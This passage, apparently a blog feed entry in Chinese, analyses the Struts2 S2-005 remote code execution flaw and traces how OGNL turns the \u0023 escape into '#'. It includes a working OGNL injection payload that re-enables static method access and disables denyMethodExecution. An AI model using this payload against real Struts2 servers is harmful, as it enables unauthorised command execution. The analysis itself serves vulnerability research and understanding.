-<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>S2-005的出现时因为官方对S2-003的修补的不完全导致的。官方通过增加安全配置禁止静态方法调用（allowStaticMethodAcces）和类方法执行（MethodAccessor.den<br>yMethodExecution）等来修补。但同样的直接使用上面的技巧，更改poc为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(&apos;\u0023_memberAccess[\&apos;allowStaticMethodAccess\&apos;]&apos;)(meh)=true&amp;(aaa)((&apos;\u0023context[\&apos;xwork.MethodAccessor.denyMethodExecution\&apos;]\u003d\u0023foo&apos;)(\u0023foo\u003dnew%20java.lang.Boolean(&quot;false&quot;)))&amp;(asdf)((&apos;\u0023rt.exit(1)&apos;)(\u0023rt\u003d@java.lang.Runtime@getRuntime()))=1</div></pre></td></tr></table></figure></p>
-<p>即可设置<code>allowStaticMethodAccess</code>为true，和<code>denyMethodExecution</code>为false，从而导致任意命令执行。可以参考<a href="https://blog.csdn.net/u011721501/article/details/41626959" target="_blank" rel="external">Struts2漏洞分析与研究之S2-005漏洞分析</a>和<a href="http://blog.o0o.nu/2010/07/cve-2010-1870-struts2xwork-remote.html" target="_blank" rel="external">CVE-2010-1870: Struts2/XWork remote command execution</a>。其余的代码调用等，与S2-003相同，分析见上。</p>
-<h1 id="ognl的解析"><a href="#ognl的解析" class="headerlink" title="ognl的解析"></a>ognl的解析</h1><p>一个问题，为什么<code>\u0023</code>形式的poc能够被解析呢？<br><img src="" alt=""><a href="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/8.png?raw=true" target="_blank" rel="external">https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/8.png?raw=true</a></p>
-<p>跟入<code>setValue</code> 至 struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/util/OgnlValueStack.java:170</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/10.png?raw=true" alt=""></p>
-<p>跟入<code>OgnlUtil.setValue</code>,struts/xwork-2.0.5-sources.jar!/com/opensymphony/xwork2/util/OgnlUtil.java:185</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">setValue</span><span class="params">(String name, Map context, Object root, Object value)</span> <span class="keyword">throws</span> OgnlException </span>&#123;</div><div class="line">    Ognl.setValue(compile(name), context, root, value);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
-<p>此处name即我们传入的参数<code>(\u0023...</code>，跟入<code>compile</code>中的<code>o = Ognl.parseExpression(expression);</code>:</p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/11.png?raw=true" alt=""></p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parseExpression</span><span class="params">( String expression )</span> <span class="keyword">throws</span> OgnlException</span></div><div class="line">&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        OgnlParser parser = <span class="keyword">new</span> OgnlParser( <span class="keyword">new</span> StringReader(expression) );</div><div class="line">        <span class="keyword">return</span> parser.topLevelExpression();</div><div class="line">    &#125;</div></pre></td></tr></table></figure>
-<p>从<code>topLevelExpression</code>就开始了进行语法分析工作。在获得<code>(</code>的token为44后，接着进行<code>expression();</code>的解析。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/12.png?raw=true" alt=""></p>
-<p>在其中会调用到 ognl/JavaCharStream.java 的<code>readChar</code>。其中代码摘取部分如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">char</span> <span class="title">readChar</span><span class="params">()</span> <span class="keyword">throws</span> java.io.IOException</span></div><div class="line">&#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">char</span> c;</div><div class="line"></div><div class="line">    <span class="keyword">if</span> ((buffer[bufpos] = c = ReadByte()) == <span class="string">'\\'</span>)</div><div class="line">    &#123;</div><div class="line">    ...</div><div class="line">    <span class="keyword">int</span> backSlashCnt = <span class="number">1</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (;;) <span class="comment">// Read all the backslashes</span></div><div class="line">    &#123;</div><div class="line">        <span class="keyword">try</span></div><div class="line">        &#123;</div><div class="line">            <span class="keyword">if</span> ((buffer[bufpos] = c = ReadByte()) != <span class="string">'\\'</span>)</div><div class="line">            &#123;</div><div class="line">                UpdateLineColumn(c);</div><div class="line">                <span class="comment">// found a non-backslash char.</span></div><div class="line">                <span class="keyword">if</span> ((c == <span class="string">'u'</span>) &amp;&amp; ((backSlashCnt &amp; <span class="number">1</span>) == <span class="number">1</span>))</div><div class="line">                &#123;</div><div class="line">                <span class="keyword">if</span> (--bufpos &lt; <span class="number">0</span>)</div><div class="line">                    bufpos = bufsize - <span class="number">1</span>;</div><div class="line">                <span class="keyword">break</span>;</div><div class="line">                &#125;</div><div class="line"></div><div class="line">                backup(backSlashCnt);</div><div class="line">                <span class="keyword">return</span> <span class="string">'\\'</span>;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        ...</div><div class="line">    &#125;</div></pre></td></tr></table></figure></p>
-<p>读取<code>\</code>，并在之后如果遇到了<code>u</code>则进一步处理：<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/13.png?raw=true" alt=""><br>从而把<code>\u0023</code>转换成了<code>#</code>。之后执行ognl表达式时即执行<code>&quot;#context[\&#39;xwork.MethodAccessor.denyMethodExecution\&#39;]=false&quot;</code></p>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20180507/14.png?raw=true" alt=""></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/2323&quot;&gt;阿里先知安全社区：【struts2 命令/代码执行漏洞分析系列】S2-003和S3-005&lt;/a&gt;&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web Security" scheme="http://chybeta.github.io/categories/Web-Security/"/>
-    
-    
-      <category term="代码执行" scheme="http://chybeta.github.io/tags/%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="命令执行" scheme="http://chybeta.github.io/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
-    
-      <category term="struts2" scheme="http://chybeta.github.io/tags/struts2/"/>
-    
-      <category term="s2" scheme="http://chybeta.github.io/tags/s2/"/>
     
   </entry>
   
